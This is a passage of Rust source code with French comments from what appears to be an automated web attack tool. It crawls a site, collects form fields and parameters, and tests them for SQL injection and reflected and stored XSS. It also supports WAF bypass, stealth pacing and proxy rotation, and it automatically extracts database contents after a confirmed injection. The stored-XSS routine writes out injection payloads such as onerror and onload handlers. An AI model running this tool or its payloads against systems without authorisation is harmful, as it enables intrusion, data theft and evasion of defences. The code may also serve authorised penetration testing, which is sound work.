            let attrs_str = inp.get(1).map(|m| m.as_str()).unwrap_or("");
            let mut name = String::new();
            for attr in re_attr.captures_iter(attrs_str) {
                if attr_name(&attr) == "name" {
                    name = attr_value(&attr).unwrap_or_default();
                }
            }
            if !name.is_empty() {
                inputs.push(InputInfo {
                    name,
                    input_type: "textarea".into(),
                    value: None,
                    injectable: true,
                });
            }
        }
        // Selects : le `name` du `<select>` est soumis comme n'importe quel champ.
        for sel in re_select.captures_iter(form_body) {
            let attrs_str = sel.get(1).map(|m| m.as_str()).unwrap_or("");
            let mut name = String::new();
            for attr in re_attr.captures_iter(attrs_str) {
                if attr_name(&attr) == "name" {
                    name = attr_value(&attr).unwrap_or_default();
                }
            }
            if !name.is_empty() {
                inputs.push(InputInfo {
                    name,
                    input_type: "select".into(),
                    value: None,
                    injectable: true,
                });
            }
        }

        if !inputs.is_empty() {
            forms.push(FormInfo {
                page_url: page_url.to_string(),
                action,
                method,
                inputs,
                has_csrf,
            });
        }
    }
    forms
}

fn extract_title(html: &str) -> Option<String> {
    let re = regex::Regex::new(r"(?is)<title[^>]*>(.*?)</title>").ok()?;
    re.captures(html)?
        .get(1)
        .map(|m| m.as_str().trim().chars().take(100).collect())
        .filter(|s: &String| !s.is_empty())
}

// Motifs regex **littéraux** : compilation infaillible (couvert par tests).
#[allow(clippy::unwrap_used)]
fn extract_emails(html: &str) -> Vec<String> {
    let re = regex::Regex::new(r"[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}").unwrap();
    re.find_iter(html)
        .map(|m| m.as_str().to_string())
        .collect::<std::collections::HashSet<_>>()
        .into_iter()
        .collect()
}

// Motifs regex **littéraux** : compilation infaillible (couvert par tests).
#[allow(clippy::unwrap_used)]
fn extract_html_comments(html: &str) -> Vec<String> {
    let re = regex::Regex::new(r"<!--(.*?)-->").unwrap();
    re.captures_iter(html)
        .filter_map(|c| c.get(1))
        .map(|m| m.as_str().trim().to_string())
        .filter(|s| s.len() > 10 && !s.starts_with('[')) // Skip IE conditionals
        .collect()
}

fn extract_get_params(url: &str) -> Vec<String> {
    if let Some(query) = url.split('?').nth(1) {
        query
            .split('&')
            .filter_map(|p| p.split('=').next())
            .map(|s| s.to_string())
            .collect()
    } else {
        Vec::new()
    }
}

fn detect_tech_hints(html: &str) -> Vec<String> {
    let mut hints = Vec::new();
    let lower = html.to_lowercase();
    if lower.contains("wp-content") || lower.contains("wp-includes") {
        hints.push("WordPress".into());
    }
    if lower.contains("drupal") || lower.contains("sites/default") {
        hints.push("Drupal".into());
    }
    if lower.contains("joomla") || lower.contains("components/com_") {
        hints.push("Joomla".into());
    }
    if lower.contains("laravel_session") {
        hints.push("Laravel".into());
    }
    if lower.contains("django") || lower.contains("csrfmiddlewaretoken") {
        hints.push("Django".into());
    }
    if lower.contains("rails") || lower.contains("authenticity_token") {
        hints.push("Ruby on Rails".into());
    }
    if lower.contains("__next") || lower.contains("_next/static") {
        hints.push("Next.js".into());
    }
    if lower.contains("struts") {
        hints.push("Apache Struts".into());
    }
    if lower.contains("spring") {
        hints.push("Spring".into());
    }
    if lower.contains("phpmyadmin") {
        hints.push("phpMyAdmin".into());
    }
    hints
}

fn detect_sensitive_paths(url: &str) -> Vec<String> {
    let sensitive_patterns = [
        ".env", ".git", "backup", "config", "admin", "phpinfo", "debug",
    ];
    sensitive_patterns
        .iter()
        .filter(|&&p| url.to_lowercase().contains(p))
        .map(|&p| p.to_string())
        .collect()
}

fn normalize_url(url: &str, base: &str) -> String {
    let url = url.trim();
    if url.starts_with("http://") || url.starts_with("https://") {
        return url.to_string();
    }
    if url.starts_with("//") {
        let scheme = if base.starts_with("https") {
            "https:"
        } else {
            "http:"
        };
        return format!("{}{}", scheme, url);
    }
    if url.starts_with('/') {
        // Extract base origin
        if let Some(origin) = base
            .split('/')
            .take(3)
            .collect::<Vec<_>>()
            .join("/")
            .parse::<String>()
            .ok()
        {
            return format!("{}{}", origin, url);
        }
    }
    if url.is_empty()
        || url.starts_with('#')
        || url.starts_with("javascript:")
        || url.starts_with("mailto:")
    {
        return String::new();
    }
    // Relative path
    let base_dir = if base.ends_with('/') {
        base.to_string()
    } else {
        base.rsplitn(2, '/').nth(1).unwrap_or(base).to_string() + "/"
    };
    format!("{}{}", base_dir, url)
}

fn extract_host(url: &str) -> String {
    url.split('/').nth(2).unwrap_or("").to_string()
}

/// Compare les hosts en ignorant le port pour tolérer les redirections http↔https
fn is_same_host(url: &str, base_host: &str) -> bool {
    if url.is_empty() {
        return false;
    }
    let url_host = extract_host(url);
    if url_host.is_empty() {
        return false;
    }
    // Comparaison exacte d'abord
    if url_host == base_host {
        return true;
    }
    // Comparaison sans port (strip :PORT)
    let url_bare = url_host.split(':').next().unwrap_or(&url_host);
    let base_bare = base_host.split(':').next().unwrap_or(base_host);
    url_bare == base_bare
}

// Motif regex **littéral** : compilation infaillible (couvert par tests).
#[allow(clippy::unwrap_used)]
fn extract_first_text_content(html: &str, max: usize) -> String {
    let re = regex::Regex::new(r"<[^>]+>").unwrap();
    let text = re.replace_all(html, " ");
    let trimmed: String = text
        .split_whitespace()
        .filter(|s| s.len() > 2)
        .take(5)
        .collect::<Vec<_>>()
        .join(" ");
    trimmed.chars().take(max).collect()
}

// ─────────────────────────────────────────────────────────────────────────────
// API publique : scan web complet avec spider
// ─────────────────────────────────────────────────────────────────────────────

pub struct WebScanConfig {
    pub max_pages: usize,
    pub max_depth: usize,
    pub test_sqli: bool,
    pub test_xss: bool,
    pub extract_data: bool,
    pub timeout: Duration,
    pub ssrf_callback: Option<String>,
    /// Contexte d'auth opérateur, propagé au spider et aux scanners d'injection (P0.4).
    pub auth: WebAuth,
    /// Nb de paramètres testés en parallèle par scanner (P0.1).
    pub concurrency: usize,
    /// Pacing furtif propagé aux scanners d'injection (`--stealth`, cf.
    /// `WebAttackConfig::stealth_level`).
    pub stealth_level: String,
    /// Rejeu tamper des payloads quand un WAF bloque (P0.2).
    pub waf_bypass: bool,
    /// Essais par requête sur erreur réseau transitoire (P1.1).
    pub retries: usize,
    /// Pool de proxies (P1.3) — le crawl reste « sticky » sur le premier proxy
    /// pour préserver l'intégrité de session, les scanners d'injection rotent.
    pub proxies: Vec<String>,
    /// Extensions statiques additionnelles exclues du crawl (`--spider-ext`).
    pub extra_static_ext: Vec<String>,
}

impl Default for WebScanConfig {
    fn default() -> Self {
        Self {
            max_pages: 30,
            max_depth: 3,
            test_sqli: true,
            test_xss: true,
            extract_data: true,
            timeout: Duration::from_secs(10),
            ssrf_callback: None,
            auth: WebAuth::default(),
            concurrency: 16,
            stealth_level: "default".into(),
            waf_bypass: true,
            retries: 2,
            proxies: Vec::new(),
            extra_static_ext: Vec::new(),
        }
    }
}

pub async fn full_web_scan_with_spider(
    base_url: &str,
    cfg: &WebScanConfig,
) -> (
    SpiderResult,
    Vec<crate::web_attack::WebVuln>,
    Vec<SqliExtraction>,
) {
    println!(
        "\n  \x1b[38;5;196m[WEB-SCAN+SPIDER]\x1b[0m Scan complet de \x1b[33m{}\x1b[0m",
        base_url
    );

    // 1. Spider (avec le contexte d'auth pour atteindre la surface authentifiée).
    //    Le parallélisme du crawl suit le pacing furtif et le délai vient de la
    //    configuration, comme pour les scanners d'injection.
    let crawl_concurrency =
        crate::web_attack::paced_concurrency(&cfg.stealth_level, cfg.concurrency);
    let mut spider = WebSpider::new(
        base_url,
        cfg.max_pages,
        cfg.max_depth,
        crawl_concurrency,
        cfg.timeout,
        &cfg.auth,
        &cfg.proxies,
        cfg.extra_static_ext.clone(),
    );
    let spider_result = spider.crawl(base_url).await;

    // 2. Collecter tous les paramètres découverts
    let mut all_params: HashSet<String> = HashSet::new();
    for page in &spider_result.pages {
        for p in &page.params {
            all_params.insert(p.clone());
        }
    }
    for form in &spider_result.forms {
        for input in &form.inputs {
            if input.injectable {
                all_params.insert(input.name.clone());
            }
        }
    }

    let param_vec: Vec<&str> = all_params.iter().map(|s| s.as_str()).collect();
    println!("  → {} paramètres à tester", param_vec.len());

    let mut all_vulns = Vec::new();
    let mut all_extractions = Vec::new();

    // 3. Tester chaque page découverte
    let web_cfg = crate::web_attack::WebAttackConfig {
        ssrf_callback: cfg.ssrf_callback.clone(),
        test_ssrf: cfg.ssrf_callback.is_some() || crate::oob::OobListener::dns_domain().is_some(),
        concurrency: cfg.concurrency.max(1),
        stealth_level: cfg.stealth_level.clone(),
        waf_bypass: cfg.waf_bypass,
        auth: cfg.auth.clone(),
        retries: cfg.retries.max(1),
        proxies: cfg.proxies.clone(),
        ..Default::default()
    };

    for page in &spider_result.pages {
        if page.params.is_empty() && !spider_result.forms.iter().any(|f| f.page_url == page.url) {
            continue;
        }
        let page_params: Vec<&str> = page.params.iter().map(|s| s.as_str()).collect();
        if page_params.is_empty() {
            continue;
        }

        // SQLi
        if cfg.test_sqli {
            let vulns = crate::web_attack::scan_sqli(&page.url, &page_params, &web_cfg).await;
            // Si SQLi trouvé et extraction demandée
            if cfg.extract_data {
                for v in &vulns {
                    let technique = if v.vuln_type.contains("Union") {
                        "union"
                    } else if v.vuln_type.contains("Blind") {
                        "blind"
                    } else {
                        "error"
                    };
                    let extraction = sqli_extract(
                        &page.url,
                        &v.parameter,
                        "GET",
                        technique,
                        &cfg.auth,
                        &cfg.proxies,
                    )
                    .await;
                    if extraction.db_version.is_some() || !extraction.databases.is_empty() {
                        all_extractions.push(extraction);
                    }
                }
            }
            all_vulns.extend(vulns);
        }

        // XSS reflected
        if cfg.test_xss {
            let vulns = crate::web_attack::scan_xss(&page.url, &page_params, &web_cfg).await;
            all_vulns.extend(vulns);
        }

        // Stored XSS — injecter sur cette page, puis vérifier sur les autres pages déjà crawlées
        if cfg.test_xss && !page.params.is_empty() {
            let stored = test_stored_xss(
                &page.url,
                &page_params,
                &spider_result
                    .pages
                    .iter()
                    .map(|p| p.url.as_str())
                    .collect::<Vec<_>>(),
            )
            .await;
            if !stored.is_empty() {
                println!(
                    "  \x1b[38;5;196m[STORED-XSS]\x1b[0m {} stored XSS sur {:.60}",
                    stored.len(),
                    page.url
                );
                all_vulns.extend(stored);
            }
        }
    }

    // 4. Tester les formulaires
    for form in &spider_result.forms {
        let form_params: Vec<&str> = form
            .inputs
            .iter()
            .filter(|i| i.injectable)
            .map(|i| i.name.as_str())
            .collect();
        if form_params.is_empty() {
            continue;
        }

        if cfg.test_sqli {
            let vulns = crate::web_attack::scan_sqli(&form.action, &form_params, &web_cfg).await;

            // Extraction des données pour les SQLi confirmées sur formulaire.
            // `scan_sqli` teste GET **et** POST et préfixe les findings POST par
            // `POST:` : la méthode d'extraction doit s'aligner sur ce libellé.
            if cfg.extract_data {
                for v in &vulns {
                    let is_post = v.parameter.starts_with("POST:");
                    let param = v.parameter.strip_prefix("POST:").unwrap_or(&v.parameter);
                    let method = if is_post { "POST" } else { "GET" };
                    let technique = if v.vuln_type.contains("Union") {
                        "union"
                    } else if v.vuln_type.contains("Blind") || v.vuln_type.contains("Boolean") {
                        "blind"
                    } else if v.vuln_type.contains("Time") {
                        "blind"
                    } else {
                        "error"
                    };
                    let extraction = sqli_extract(
                        &form.action,
                        param,
                        method,
                        technique,
                        &cfg.auth,
                        &cfg.proxies,
                    )
                    .await;
                    if extraction.db_version.is_some() || !extraction.databases.is_empty() {
                        all_extractions.push(extraction);
                    }
                }
            }

            all_vulns.extend(vulns);
        }
    }

    let crit = all_vulns
        .iter()
        .filter(|v| v.severity == "CRITICAL")
        .count();
    // Déduplication (plusieurs pages peuvent réutiliser le même endpoint Drupal search)
    let all_vulns = dedup_web_vulns(all_vulns);
    println!(
        "\n  \x1b[36m[RÉSULTAT]\x1b[0m {} pages crawlées, {} vulns ({} CRITICAL), {} extractions",
        spider_result.pages.len(),
        all_vulns.len(),
        crit,
        all_extractions.len()
    );

    (spider_result, all_vulns, all_extractions)
}

// ─────────────────────────────────────────────────────────────────────────────
// Stored XSS Detection
//
// Principe en 3 étapes :
//   1. Injecter un payload XSS avec un marqueur unique sur la page source
//   2. Attendre brièvement (les apps stockent avant de servir)
//   3. Récupérer les pages de vérification et chercher le marqueur
//
// Si le marqueur apparaît dans une page DIFFÉRENTE de la page d'injection
// → stored XSS confirmé (le payload a été persisté et servi à d'autres)
// ─────────────────────────────────────────────────────────────────────────────

/// Teste le stored XSS sur `inject_url` et vérifie la réflexion sur `verify_urls`.
/// Retourne une liste de WebVuln si le payload est retrouvé sur une page de vérification.
pub async fn test_stored_xss(
    inject_url: &str,
    params: &[&str],
    verify_urls: &[&str],
) -> Vec<crate::web_attack::WebVuln> {
    let mut vulns = Vec::new();

    let client = Client::builder()
        .timeout(Duration::from_secs(12))
        .danger_accept_invalid_certs(true)
        .user_agent(browser_ua())
        .build()
        .unwrap_or_default();

    // Payloads stored XSS avec marqueur unique
    let marker_base = format!(
        "NRTG{:x}",
        std::time::SystemTime::now()
            .duration_since(std::time::UNIX_EPOCH)
            .unwrap_or_default()
            .subsec_micros()
    );

    let payloads = [
        format!("<img src=x onerror=alert('{}')>", marker_base),
        format!("<svg onload=alert('{}')>", marker_base),
        format!("\"><script>/*{}*/</script>", marker_base),
        format!("javascript:alert('{}')", marker_base),
    ];

    for param in params.iter().take(5) {
        for payload in &payloads {
            // Étape 1 : Injecter le payload via GET et POST
            let _ = inject(&client, inject_url, param, "GET", payload).await;
            let _ = inject(&client, inject_url, param, "POST", payload).await;

            // Étape 2 : Petite pause (laisser l'app stocker)
            tokio::time::sleep(Duration::from_millis(600)).await;

            // Étape 3 : Vérifier sur toutes les pages de vérification
            for &verify_url in verify_urls {
                // Ne pas vérifier la page d'injection elle-même (ça serait du reflected)
                if verify_url == inject_url {
                    continue;
                }

                if let Ok(resp) = client.get(verify_url).send().await {
                    let body = crate::web_attack::read_body_bounded(resp).await;
                    {
                        if body.contains(&marker_base) {
                            println!(
                                "  \x1b[38;5;196m[STORED-XSS]\x1b[0m Marqueur '{}' trouvé sur {:.60} (injecté via param='{}' sur {:.60})",
                                marker_base,
                                verify_url,
                                param,
                                inject_url,
                            );
                            vulns.push(crate::web_attack::WebVuln {
                                vuln_type: "Stored XSS".to_string(),
                                url: inject_url.to_string(),
                                parameter: param.to_string(),
                                payload: payload.clone(),
                                evidence: format!(
                                    "Marqueur '{}' retrouvé sur {} après injection via param='{}'. \
                                     Risque d'exfiltration de cookies session.",
                                    marker_base, verify_url, param
                                ),
                                severity: "HIGH".to_string(),
                                confidence: 0.90,
                                remediation:
                                    "Encoder les sorties en contexte HTML/JS (htmlspecialchars). \
                                             Implémenter Content-Security-Policy strict."
                                        .to_string(),
                            });
                            // Un seul finding par (param, verify_url) suffit
                            break;
                        }
                    }
                }
            }
        }
    }

    vulns
}

// Déduplication globale des vulns (ex: /fr/search/node vs /af/search/node sur CMS multi-langue)
// Retient le premier finding par triplet (vuln_type, endpoint_normalisé, paramètre)
fn dedup_web_vulns(vulns: Vec<crate::web_attack::WebVuln>) -> Vec<crate::web_attack::WebVuln> {
    use std::collections::HashSet;
    let mut seen: HashSet<(String, String, String)> = HashSet::new();
    let mut out = Vec::with_capacity(vulns.len());
    for v in vulns {
        // Normalise l'URL : retire query string, trailing slash, et préfixe langue /{xx}/
        let normalized = normalize_web_endpoint(&v.url);
        let key = (v.vuln_type.clone(), normalized, v.parameter.clone());
        if !seen.contains(&key) {
            seen.insert(key);
            out.push(v);
        }
    }
    out
}

fn normalize_web_endpoint(url: &str) -> String {
    let mut s = url.to_string();
    // 1. Retire query string
    if let Some(i) = s.find('?') {
        s.truncate(i);
    }
    if let Some(i) = s.find('#') {
        s.truncate(i);
    }
    // 2. Retire trailing slash
    while s.ends_with('/') {
        s.pop();
    }
    // 3. Retire préfixes de langue style /fr/ /en/ /af/ /de/ (2-3 lettres entre slashes après origin)
    if let Ok(u) = url::Url::parse(&s) {
        let origin = format!(
            "{}://{}{}",
            u.scheme(),
            u.host_str().unwrap_or(""),
            u.port().map(|p| format!(":{}", p)).unwrap_or_default()
        );
        let path = u.path();
        let path_trim = path.trim_end_matches('/');
        let new_path = if let Some(rest) = path_trim.strip_prefix('/') {
            // premier segment 2-3 lettres alpha = code langue probable
            let mut it = rest.splitn(2, '/');
            let first = it.next().unwrap_or("");
            let looks_like_lang = (first.len() == 2 || first.len() == 3)
                && first.chars().all(|c| c.is_ascii_alphabetic())
                && !matches!(
                    first,
                    "api" | "www" | "cdn" | "app" | "adm" | "inc" | "lib" | "bin" | "src"
                );
            if looks_like_lang {
                if let Some(tail) = it.next() {
                    format!("/{}", tail)
                } else {
                    String::from("/")
                }
            } else {
                path.to_string()
            }
        } else {
            path.to_string()
        };
        return format!("{}{}", origin, new_path.trim_end_matches('/'));
    }
    s
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn load_static_ext_file_normalizes_and_dedups() {
        let dir = tempfile::tempdir().unwrap();
        let f = dir.path().join("ext.txt");
        std::fs::write(&f, "# commentaire\n.bak\nOLD\n  .SQL  \n.bak\n").unwrap();
        let ext = load_static_ext_file(f.to_str().unwrap()).unwrap();
        assert_eq!(
            ext,
            vec![".bak".to_string(), ".old".to_string(), ".sql".to_string()]
        );

        // Chemin illisible → erreur explicite.
        assert!(load_static_ext_file("/nonexistent/nope.txt").is_err());
    }

    #[test]
    fn keep_link_excludes_extra_static_ext() {
        let extra = vec![".bak".to_string(), ".sql".to_string()];
        let mut out = Vec::new();
        keep_link(
            "https://example.test/dump.sql",
            "https://example.test/",
            &mut out,
            &extra,
        );
        keep_link(
            "https://example.test/app.js",
            "https://example.test/",
            &mut out,
            &extra,
        );
        keep_link(
            "https://example.test/index.php",
            "https://example.test/",
            &mut out,
            &extra,
        );
        assert_eq!(out.len(), 1);
        assert!(out[0].ends_with("index.php"));
    }
}
